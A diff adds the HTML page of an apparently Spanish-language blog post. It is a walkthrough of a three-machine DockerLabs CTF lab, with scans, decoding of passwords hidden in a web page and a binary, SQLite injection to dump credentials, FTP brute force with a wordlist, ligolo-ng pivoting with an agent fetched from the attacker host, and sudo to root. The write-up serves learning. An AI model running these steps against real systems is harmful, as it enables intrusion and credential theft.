@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BNTQPFSFW4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-BNTQPFSFW4');
+</script>
+
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>murrusko | Road to olympus</title>
+  
+  <link rel="stylesheet" href="/assets/css/post.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css" />
+  
+  <link rel="stylesheet" href="/assets/css/common.css" />
+  <script src="/assets/js/categories.js"></script>
+  <script>
+    const currentTheme = localStorage.getItem("theme");
+    if (currentTheme) {
+      document.documentElement.setAttribute(
+        "data-theme",
+        localStorage.getItem("theme")
+      );
+    }
+  </script>
+  
+  <script defer src="/assets/js/lbox.js"></script>
+  
+</head>
+
+  <body>
+    <main>
+      <header>
+  <a class="site-title" href="/">murrusko</a>
+  <!-- dark/light mode -->
+  <span id="dark-mode-toggle" style="cursor: pointer">
+    <svg
+      stroke="currentColor"
+      fill="currentColor"
+      stroke-width="0"
+      viewBox="0 0 16 16"
+      height="1.2em"
+      width="1.2em"
+      xmlns="http://www.w3.org/2000/svg"
+    >
+      <path
+        d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 13V2a6 6 0 1 1 0 12z"
+      ></path>
+    </svg>
+  </span>
+</header>
+
+      <section class="article">
+        <div class="article-header">
+          <h2 class="article-title">Road to olympus</h2>
+          <small class="date">17 Sep 2024</small>
+          <div class="categories">
+            
+            <a href="#!" class="category">dockerlabs</a>
+            
+            <a href="#!" class="category">ctf</a>
+            
+            <a href="#!" class="category">linux</a>
+            
+            <a href="#!" class="category">dificil</a>
+            
+          </div>
+        </div>
+        <div class="content"><p>Estamos ante un laboratorio que contiene 3 máquinas con distribuciones Linux creado por <strong>Patxasec</strong>. Es de nivel difícil y es de la plataforma <a href="https://dockerlabs.es/">dockerlabs</a>.</p>
+
+<h1 id="1-hades">1-Hades</h1>
+
+<p>Empezamos haciendo un escaneo rápido de puertos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rustscan <span class="nt">-a</span> 10.10.10.2 <span class="nt">-b</span> 25
+Open 10.10.10.2:22
+Open 10.10.10.2:80
+</code></pre></div></div>
+
+<p>Encontramos los puertos <strong>22</strong> y <strong>80</strong> abiertos. Ahora hacemos un escaneo de servicios y versiones con <code class="language-plaintext highlighter-rouge">nmap</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-v</span> 10.10.10.2
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   256 7e851a70b52ec635739b6477ba5f728b <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 0a6756221ea1aa0544f0b905756d9c36 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Werkzeug/3.0.4 Python/3.12.3
+|_http-server-header: Werkzeug/3.0.4 Python/3.12.3
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-title: Not A CTF
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/3.0.4 Python/3.12.3
+
+</code></pre></div></div>
+
+<p>No vemos nada relevante, asi que vamos a explorar la web con <code class="language-plaintext highlighter-rouge">curl</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-vvvv</span> http://10.10.10.2
+&lt;<span class="o">!</span><span class="nt">--</span> Guardar en KeePass y borrar al verlo.
+Nueva contraseña para el servicio SSH de cerbero el perro de 3 cabezas <span class="nv">JZKECZ2NPJAWOTT2JVTU42SVM5HGU23HJZVFCZ22NJGWOTTNKVTU26SJM5GXUQLHJV5ESZ2NPJEWOTLKIU6Q</span><span class="o">====</span> <span class="nt">--</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>Encontramos un hash. Tratamos de decodearlo usando <strong>base64</strong> pero no tenemos resultado. Usando <a href="https://cyberchef.io/">cyberchef</a> vemos que esta encodeado primero usando <strong>base32</strong> y luego en <strong>base64</strong> para darnos un resultado en <strong>hexadecimal</strong>. Usamos <code class="language-plaintext highlighter-rouge">xxd -r -p</code> para pasar de hexadecimal a texto simple:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'JZKECZ2NPJAWOTT2JVTU42SVM5HGU23HJZVFCZ22NJGWOTTNKVTU26SJM5GXUQLHJV5ESZ2NPJEWOTLKIU6Q===='</span> | <span class="nb">base32</span> <span class="nt">-d</span> | <span class="nb">base64</span> <span class="nt">-d</span> | xxd <span class="nt">-r</span> <span class="nt">-p</span>
+P0seidón2022!
+</code></pre></div></div>
+
+<p>Encontramos un password para un supuesto usuario <strong>cerbero</strong>. Probamos a conectarnos usando esas credenciales y obtenemos acceso a la primera máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh cerbero@10.10.10.2
+cerbero@10.10.10.2<span class="s1">'s password: 
+To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
+See "man sudo_root" for details.
+
+cerbero@4657df97b944:~$
+</span></code></pre></div></div>
+
+<h3 id="pivoting">Pivoting</h3>
+
+<p>Vamos a usar <a href="https://github.com/Nicocha30/ligolo-ng">ligolo-ng</a> para hacer el pivoting a las diferentes redes. Nos bajamos del repositorio las versiones que necesitamos y nos mandamos a la máquina víctima el agente. Le damos también permiso de ejecución.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cerbero@7c938e91755b:~<span class="nv">$ </span>wget http://10.10.10.1:8000/agent <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +x agent
+</code></pre></div></div>
+
+<p>En nuestro equipo nos ponemos a la escucha con el binario <code class="language-plaintext highlighter-rouge">proxy</code> y le ponemos como argumento <code class="language-plaintext highlighter-rouge">-selfcert</code> para que nos genere un certificado para la sesión. Es importante ejecutarlo como <strong>root</strong> porque debemos crear interfaces y es necesario ser root para crearlas.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> ./proxy <span class="nt">-selfcert</span>
+</code></pre></div></div>
+
+<p>Desde la máquina victima ejecutamos el agente para que se conecte a nuestro proxy y que no valide el certificado:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cerbero@febfcab0b0a6:~<span class="nv">$ </span>./agent <span class="nt">-connect</span> 10.10.10.1:11601 <span class="nt">-ignore-cert</span>
+WARN[0000] warning, certificate validation disabled     
+INFO[0000] Connection established                        <span class="nv">addr</span><span class="o">=</span><span class="s2">"10.10.10.1:11601"</span>
+</code></pre></div></div>
+
+<p>Vemos que se ha establecido la conexión. En el proxy seleccionamos la sesión recien creada con <code class="language-plaintext highlighter-rouge">session</code>. Una vez elegida ejecutamos <code class="language-plaintext highlighter-rouge">autoroute</code>. Elegimos la red a la que queremos pivotar, le indicamos que nos cree una interfaz nueva y que inicie el tunel.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ligolo-ng » INFO[0111] Agent joined.                                 <span class="nv">name</span><span class="o">=</span>cerbero@febfcab0b0a6 <span class="nv">remote</span><span class="o">=</span><span class="s2">"10.10.10.2:52042"</span>
+ligolo-ng » session
+? Specify a session : 1 - cerbero@febfcab0b0a6 - 10.10.10.2:52042 - ae1e5a3e-c937-46d2-b383-ef4960acca26
+<span class="o">[</span>Agent : cerbero@febfcab0b0a6] » autoroute
+? Select routes to add: 20.20.20.2/24? Create a new interface or use an existing one? Create a new interface
+INFO[0161] Generating a random interface name...        
+INFO[0161] Creating a new <span class="s2">"justego"</span> interface...        
+INFO[0161] Using interface justego, creating routes...  
+INFO[0161] Route 20.20.20.2/24 created.                 
+? Start the tunnel? Yes
+<span class="o">[</span>Agent : cerbero@febfcab0b0a6] » INFO[0164] Starting tunnel to cerbero@febfcab0b0a6
+</code></pre></div></div>
+
+<p>Si todo ha salido bien ya tendremos acceso a la máquina <strong>Poseidon</strong>.</p>
+
+<h1 id="2-poseidon">2-Poseidon</h1>
+
+<p>Hacemos un escaneo rápido con <code class="language-plaintext highlighter-rouge">rustscan</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rustscan <span class="nt">-a</span> 20.20.20.3 <span class="nt">-b</span> 30
+Open 20.20.20.3:22
+Open 20.20.20.3:80
+</code></pre></div></div>
+
+<p>Encontramos los puertos <strong>22</strong> y <strong>80</strong> abiertos. Ahora hacemos un escaneo de servicios y versiones con <code class="language-plaintext highlighter-rouge">nmap</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-v</span> 20.20.20.3
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 41eae9708838112b1f363acbbd1abbe2 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 2cd8bf01057e7a70387c7bf2ba544b20 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 2037e59215dc6918dc09bb69746daec5 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.54 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-server-header: Apache/2.4.54 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Dojos El Papapasito del mar
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>En esta ocasión tampoco encontramos nada relevante. Hacemos un fuzzing a ver si encontramos algo que nos permita seguir con el ataque:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-w</span> ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-r</span> <span class="nt">-d</span> 2 <span class="nt">-x</span> .php <span class="nt">-u</span> http://20.20.20.3
+200      GET        1l        6w       34c http://20.20.20.3/database.php
+200      GET      157l      357w     3863c http://20.20.20.3/buscador/oraculo.html
+</code></pre></div></div>
+
+<p>Encontramos el fichero <strong>database.php</strong> y <strong>/buscador/oraculo.html</strong>. Vemos como hace la consulta a la BBDD:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-vvvv</span> http://20.20.20.3/buscador/oraculo.html
+form.addEventListener<span class="o">(</span><span class="s1">'submit'</span>, <span class="o">(</span>e<span class="o">)</span> <span class="o">=&gt;</span> <span class="o">{</span>
+  e.preventDefault<span class="o">()</span><span class="p">;</span>
+  const buscar <span class="o">=</span> input.value.trim<span class="o">()</span><span class="p">;</span>
+  <span class="k">if</span> <span class="o">(</span>buscar <span class="o">!==</span> <span class="s1">''</span><span class="o">)</span> <span class="o">{</span>
+    fetch<span class="o">(</span><span class="s1">'../database.php'</span>, <span class="o">{</span>
+      method: <span class="s1">'POST'</span>,
+      headers: <span class="o">{</span>
+        <span class="s1">'Content-Type'</span>: <span class="s1">'application/x-www-form-urlencoded'</span>,
+      <span class="o">}</span>,
+      body: <span class="sb">`</span><span class="nv">buscar</span><span class="o">=</span><span class="k">${</span><span class="nv">encodeURIComponent</span><span class="p">(buscar)</span><span class="k">}</span><span class="sb">`</span>,
+    <span class="o">})</span>
+      .then<span class="o">((</span>response<span class="o">)</span> <span class="o">=&gt;</span> response.text<span class="o">())</span>
+      .then<span class="o">((</span>data<span class="o">)</span> <span class="o">=&gt;</span> <span class="o">{</span>
+        resultado.innerHTML <span class="o">=</span> data<span class="p">;</span>
+      <span class="o">})</span>
+      .catch<span class="o">((</span>error<span class="o">)</span> <span class="o">=&gt;</span> console.error<span class="o">(</span>error<span class="o">))</span><span class="p">;</span>
+  <span class="o">}</span>
+
+</code></pre></div></div>
+
+<p>Probamos a ver si hay alguna <strong>SQLi</strong> en el buscador:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ghauri <span class="nt">-u</span> http://20.20.20.3/database.php <span class="nt">--data</span> <span class="s1">'buscar=a'</span> <span class="nt">--dbs</span>
+Parameter: buscar <span class="o">(</span>POST<span class="o">)</span>
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: <span class="nv">buscar</span><span class="o">=</span>a<span class="s2">" AND 08905=8905– wXyW
+</span></code></pre></div></div>
+
+<p>Vemos que hay una vulnerabilidad pero es un falso positivo. Probamos a ver si la BBDD es en sqlite ya que las herramientas no están preparadas para hacer inyecciones a sqlite. Le hacemos una consulta para ver los nombres de las tablas:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">--data</span> <span class="s1">'buscar=select%20name%20from%20sqlite_master'</span> http://20.20.20.3/database.php
+dioses_semidioses&lt;br /&gt;
+sqlite_sequence&lt;br /&gt;
+powers&lt;br /&gt;
+usuarios&lt;br /&gt;
+sqlite_autoindex_usuarios_1&lt;br /&gt;
+sqlite_autoindex_usuarios_2&lt;br /&gt;
+contrasena&lt;br /&gt;
+sqlite_autoindex_contrasena_1&lt;br /&gt;
+atlantis&lt;br /&gt;
+</code></pre></div></div>
+
+<p>Encontramos varias tablas, hacemos un dump de la tabla <strong>atlantis</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">--data</span> <span class="s1">'buscar=select%20*%20from%20atlantis'</span> http://20.20.20.3/database.php
+1 | Poseidón | <span class="nv">$sha1$oceanos$QqFgxFPmqRex1ZKFCZ2ONJKWOTTNKFTU46SBM5ZKFCZ2ONJKWOTTNKFTU4GQPdkh3nQSWp3I</span><span class="o">=</span>&lt;br /&gt;
+2 | megalodon | <span class="nv">$sha1$hahahaha$JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI</span><span class="o">=</span>&lt;br /&gt;
+</code></pre></div></div>
+
+<p>Encontramos 2 usuarios con su correspondiente contraseña. Desciframos la contraseña de la misma manera que desciframos la anterior:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI='</span> | <span class="nb">base32</span> <span class="nt">-d</span> | <span class="nb">base64</span> <span class="nt">-d</span> | xxd <span class="nt">-r</span> <span class="nt">-p</span>
+Templ02019!
+</code></pre></div></div>
+
+<p>Nos conectamos con el usuario <strong>megalodon</strong> y la contraseña a la máquina <strong>Poseidon</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh megalodon@20.20.20.3
+megalodon@20.20.20.3<span class="s1">'s password:
+$ whoami
+megalodon
+$
+</span></code></pre></div></div>
+
+<p>Ahora necesitamos pasar el agente a la máquina Poseidon, y como tenemos el servidor web en python en la red 10.10.10.0 y esta máquina esta en el segmento 20.20.20.0 no podemos conectarnos directamente para descargar el agent. Ligolo-ng tiene una funcionalidad que sirve para hacer <strong>port forwarding</strong> y asi poder llegar de una red a otra. Ejecutamos <code class="language-plaintext highlighter-rouge">listener_add</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Agent : cerbero@b4fc92f8d22b] » listener_add <span class="nt">--addr</span> 0.0.0.0:8000 <span class="nt">--to</span> 127.0.0.1:8000
+INFO[0287] Listener 0 created on remote agent!
+</code></pre></div></div>
+
+<p>Y nos descargamos el <strong>agent</strong> y le damos permisos de ejecución:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>megalodon@1f0e1fcaf473:~<span class="nv">$ </span>curl http://20.20.20.2:8000/agent <span class="nt">-O</span> <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +x agent
+</code></pre></div></div>
+
+<p>Ahora tenemos que hacer lo mismo para poder conectarnos al proxy en nuestra máquina. Hacemos <strong>port forwarding</strong> del puerto <strong>11601</strong> que es donde está a la escucha nuestro <strong>proxy</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Agent : cerbero@b4fc92f8d22b] » listener_add <span class="nt">--addr</span> 0.0.0.0:11601 <span class="nt">--to</span> 127.0.0.1:11601
+INFO[0361] Listener 1 created on remote agent!
+</code></pre></div></div>
+
+<p>Esta vez en vez de conectar el agente al proxy vamos a hacer en el sentido contrario. Poner a la escucha el agente y conectarnos desde el proxy. Ponemo el agente a la escucha con el argumento <code class="language-plaintext highlighter-rouge">bind</code> y la <code class="language-plaintext highlighter-rouge">IP</code> y el <code class="language-plaintext highlighter-rouge">puerto</code> donde estará a la escucha:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>megalodon@143546c5c4b6:~<span class="nv">$ </span>./agent <span class="nt">-bind</span> 0.0.0.0:7777
+WARN[0000] TLS Certificate fingerprint is: 290A01EDAAA2C994292BF2409288C32851752B9D2C493F32AC4F03C9F507DB76 
+INFO[0000] Listening on 0.0.0.0:7777...                 
+</code></pre></div></div>
+
+<p>Ahora desde el proxy nos conectamos a Poseidon y elegimos la nueva sesión:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Agent : cerbero@b4fc92f8d22b] » connect_agent <span class="nt">--ip</span> 20.20.20.3:7777
+? TLS Certificate Fingerprint is: 290A01EDAAA2C994292BF2409288C32851752B9D2C493F32AC4F03C9F507DB76, connect? Yes
+INFO[0999] Agent connected.                              <span class="nv">name</span><span class="o">=</span>megalodon@143546c5c4b6 <span class="nv">remote</span><span class="o">=</span><span class="s2">"20.20.20.3:7777"</span>
+<span class="o">[</span>Agent : cerbero@b4fc92f8d22b] » session 
+? Specify a session : 2 - megalodon@143546c5c4b6 - 20.20.20.3:7777 - 34cad36b-0a5a-49eb-9314-2dd105235253[Agent : megalodon@143546c5c4b6] »  
+</code></pre></div></div>
+
+<p>En el agente vemos que la conexión ha sido establecida:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>INFO[0005] Got connection from: 20.20.20.2:47572        
+INFO[0005] Connection established                        <span class="nv">addr</span><span class="o">=</span><span class="s2">"20.20.20.2:47572"</span>
+</code></pre></div></div>
+
+<p>Volvemos al proxy y hacemos otro <strong>autoroute</strong> a la última red, le decimos que nos cree una interfaz nueva y que abra el túnel:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Agent : megalodon@143546c5c4b6] » autoroute 
+? Select routes to add: 30.30.30.2/24? Create a new interface or use an existing one? Create a new interface
+INFO[1125] Generating a random interface name...        
+INFO[1125] Creating a new <span class="s2">"guidedpenance"</span> interface...  
+INFO[1125] Using interface guidedpenance, creating routes... 
+INFO[1125] Route 30.30.30.2/24 created.                 
+? Start the tunnel? Yes
+<span class="o">[</span>Agent : megalodon@143546c5c4b6] » INFO[1127] Starting tunnel to megalodon@143546c5c4b6    
+<span class="o">[</span>Agent : megalodon@143546c5c4b6] » 
+</code></pre></div></div>
+
+<h1 id="3-zeus">3-Zeus</h1>
+
+<p>Vamos a por la última máquina. Volvemos a hacer un escaneo rápido:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rustscan <span class="nt">-a</span> 30.30.30.3 <span class="nt">-b</span> 35
+Open 30.30.30.3:22
+Open 30.30.30.3:21
+Open 30.30.30.3:80
+Open 30.30.30.3:139
+Open 30.30.30.3:445
+</code></pre></div></div>
+
+<p>Buscamos que servicios y que versiones hay en los puertos <strong>21,22,80,139</strong> y <strong>445</strong> con <code class="language-plaintext highlighter-rouge">nmap -sCV</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22,80,139,445 <span class="nt">-v</span> 30.30.30.3
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.5
+22/tcp  open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   256 73eb17b376b12663b8ed142a48e9c08c <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 e2c95685e511be8318238786fb943f7f <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http        Apache httpd 2.4.52 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-time: 
+|   <span class="nb">date</span>: 2024-09-14T23:16:11
+|_  start_date: N/A
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+| nbstat: NetBIOS name: ZEUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 <span class="o">(</span>Xerox<span class="o">)</span>
+| Names:
+|   ZEUS&lt;00&gt;             Flags: &lt;unique&gt;&lt;active&gt;
+|   ZEUS&lt;03&gt;             Flags: &lt;unique&gt;&lt;active&gt;
+|   ZEUS&lt;20&gt;             Flags: &lt;unique&gt;&lt;active&gt;
+|   <span class="se">\x</span>01<span class="se">\x</span>02__MSBROWSE__<span class="se">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
+|   OLIMPO&lt;00&gt;           Flags: &lt;group&gt;&lt;active&gt;
+|   OLIMPO&lt;1d&gt;           Flags: &lt;unique&gt;&lt;active&gt;
+|_  OLIMPO&lt;1e&gt;           Flags: &lt;group&gt;&lt;active&gt;
+</code></pre></div></div>
+
+<p>No vemos nada relevante. Vamos a enumerar el servicio <strong>SMB</strong> con <code class="language-plaintext highlighter-rouge">enum4linux-ng</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 enum4linux-ng.py <span class="nt">-A</span> 30.30.30.3
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Testing share shared
+<span class="o">[</span>+] Mapping: OK, Listing: OK
+
+<span class="nv">$ </span>python3 enum4linux-ng.py 30.30.30.3 <span class="nt">-R</span> 1
+<span class="o">[</span>+] Found user <span class="s1">'Unix User\rayito'</span> <span class="o">(</span>RID 1000<span class="o">)</span>
+<span class="o">[</span>+] Found user <span class="s1">'Unix User\hercules'</span> <span class="o">(</span>RID 1001<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Encontramos 2 usuarios del sistema, <strong>rayito</strong> y <strong>hercules</strong>,y un recurso compartido en el que tenemos permiso de lectura. No encontramos nada en el recurso compartido <strong>shared</strong></p>
+
+<p>Vamos a probar a hacer un ataque de fuerza bruta al servicio <strong>FTP</strong> con el usuario <strong>hercules</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>patator ftp_login <span class="nv">host</span><span class="o">=</span>30.30.30.3 <span class="nv">user</span><span class="o">=</span>hercules <span class="nv">password</span><span class="o">=</span>FILE0 <span class="nv">0</span><span class="o">=</span>rockyou.txt <span class="nt">-x</span> ignore:mesg<span class="o">=</span><span class="s1">'Login incorrect.'</span> <span class="nt">-x</span> ignore,reset,retry:code<span class="o">=</span>500
+...
+16:13:45 patator    INFO - 230   17     0.057 | thunder1                           |  3981 | Login successful.
+</code></pre></div></div>
+
+<p>Encontramos una credencial para acceder al <strong>FTP</strong>, nos conectamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ftp hercules@30.30.30.3
+Connected to 30.30.30.3.
+220 <span class="o">(</span>vsFTPd 3.0.5<span class="o">)</span>
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt;
+</code></pre></div></div>
+
+<p>Nos descargamos el fichero que hay:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; get muerte_a_kratos.exe
+</code></pre></div></div>
+
+<p>En nuestra máquina vemos que cadenas de texto hay dentro del binario. Encontramos una cadena en <strong>base64.</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>strings muerte_a_kratos.exe
+...
+<span class="nv">AGUAbABlAGMAdAByAG8AYwB1AHQANABjADEAMABuACE</span><span class="o">=</span>
+.. 
+
+</code></pre></div></div>
+
+<p>La desciframos y encontramos una posible contraseña:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'AGUAbABlAGMAdAByAG8AYwB1AHQANABjADEAMABuACE='</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+electrocut4c10n!
+</code></pre></div></div>
+
+<p>Probamos a conectarnos por <strong>ssh</strong> con el usuario <strong>rayito</strong> y obtenemos acceso a la última máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh rayito@30.30.30.3
+rayito@30.30.30.3<span class="s1">'s password:
+$ whoami
+rayito
+</span></code></pre></div></div>
+
+<p>Podemos ejecutar cualquier cosa como <strong>root</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rayito@11f0a64a79da:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>rayito on 11f0a64a79da:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
+    use_pty
+
+User rayito may run the following commands on 11f0a64a79da:
+    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: ALL
+</code></pre></div></div>
+
+<p>Nos cambiamos a <strong>root</strong> y terminamos la máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rayito@11f0a64a79da:~<span class="nv">$ </span><span class="nb">sudo </span>su
+root@11f0a64a79da:/home/rayito# <span class="nb">cd
+</span>root@11f0a64a79da:~# <span class="nb">whoami
+</span>root
+root@11f0a64a79da:~#
+</code></pre></div></div>
+</div>
+      </section>
+      <footer>
+  <p>&copy; 2024 | murrusko</p>
+</footer>
+<script src="/assets/js/mode.js" defer></script>
+
+    </main>
+    <section id="category-modal-bg"></section>
+<section id="category-modal">
+  <h1 id="category-modal-title"></h1>
+  <section id="category-modal-content"></section>
+</section>
+
+  </body>
+</html>
